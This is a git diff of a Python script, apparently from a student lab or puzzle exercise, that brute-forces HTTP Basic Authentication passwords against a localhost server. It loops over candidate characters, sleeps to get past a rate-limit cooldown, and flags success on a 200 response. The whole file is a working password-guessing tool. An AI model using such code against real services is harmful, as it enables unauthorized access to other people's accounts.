@@ -7,6 +7,11 @@ import random
 import time
 
 class zerg:
+    # Get it get it it's a zerg rush
+    # StarCraft ref - they're played by bruteforce :D
+    # like here :D
+    # until we can bamboozle the server that is
+
     def __init__(self, name: str = ""):
         #self.sel = selectors.DefaultSelector()
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -16,13 +21,7 @@ class zerg:
         self.alive = True
         self.pws_tried = []
         self.connect()
-        self.msg_buffer=""
-        self.c=0
         self.found=False
-        self.final=None
-
-    def gen_pw(self,len :int):
-        pass
 
 
     def connect(self):
@@ -37,7 +36,7 @@ class zerg:
         authHead = ID+":"+pw
         authHeadB64 = base64.b64encode(authHead.encode()).decode()
 
-        httpHeader = f'''GET / HTTP/1.1\nHost: localhost\nAuthorization: Basic {authHeadB64}\n\n'''  #internet says to use carriage return but not sure why
+        httpHeader = f'''GET / HTTP/1.1\nHost: localhost\nAuthorization: Basic {authHeadB64}\r\n\r\n'''  #internet says to use carriage return but not sure why
         
         print("testing pw:",pw)
         self.pws_tried.append(pw)
@@ -47,66 +46,29 @@ class zerg:
     def send_msg(self,msg):
         encoded_msg=str(msg).encode("utf-8")          
         self.s.send(encoded_msg)
-        print("sent msg pls respond")
         self.server_response()
-        #block waiting for a response
         
     def server_response(self):
-        #big buffer >:)
         incoming=""
         while not "\r\n\r\n" in incoming:
             try:
                 incoming_raw=self.s.recv(500)
                 incoming=incoming+incoming_raw.decode("ascii")
-                #print("incoming="+incoming)
                 
             except UnicodeDecodeError:
+                # I think we're supposed to receive a picture here but this is a puzzle for future camila :P
                 break
             
-        #add newly received contents to already existing buffer
         if  '200' in incoming.split("\n")[0]:
             self.found=True
             print("GOT IT!\nwas it "+self.pws_tried[-1]+"?")
-        
-        # Check if we got a complete message in the buffer waiting for us
-
-        
-            #print("DEBUG: response :\n",el.split("\n")[0]," \nas message number",self.c)
-            #maybe calculate the average size of all responses and then if we get a larger one, success? :D
-
-
-    def extract_from_buffer(self):
-        recv_msgs=[]
-        if "\r\n\r\n" in self.msg_buffer:
-            tmp=self.msg_buffer.split("\r\n\r\n")
-            #print("got",len(tmp),"msgs here")
-            #Get all the messages except the last (it may be complete but probably not. Leave it in buffer for next round)
-            if len(tmp)>1:
-               for i in range(0,len(tmp)-1):
-                   recv_msgs.append(tmp[i])
-                   self.c+=1
-                #TODO should verify here if any of the messages is a success!
-               #only the remains stay in the buffer.
-               self.msg_buffer=tmp[len(tmp)-1]
-
-            for msg in recv_msgs:
-                print(msg)
-                if  '200' in msg.split("\n")[0]:
-                    self.found=True
-                    print("GOT IT!\nwas it "+self.pws_tried[-1]+"?")
-            return True
-        else:
-            return False
-
+    
 
     def loop(self):
-        #main loop
         while self.alive:
             if not self.found:
                 print("all your base are belong to us") #nice ref :D
-
                 chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPKRSTUVWXYZ"
-
                 n = 1
                 count = 0
                 for i in range(1, n+1):
@@ -115,21 +77,17 @@ class zerg:
                             self.try_pw(item[0])
                             count+=1
                             if count >4: #target->5
-                                #To clear out the received messages even if we're waiting for the cooldown to reset
-                                if "\r\n\r\n" in self.msg_buffer:
-                                    self.extract_from_buffer()
-
-                                time.sleep(COOLDOWN_TIME/100)
+                                time.sleep(COOLDOWN_TIME/100) #nao gosto desta linha
                                 count = 0
-
                                 self.connect()
                         else:
                                 print("it was "+self.pws_tried[-1])
                                 return self.pws_tried[-1]
-                
             else:
-                break
-slave = zerg("joao")
+                break #doesnt work lol
+
+
+slave = zerg("Brood1")
 slave.loop()
             
             
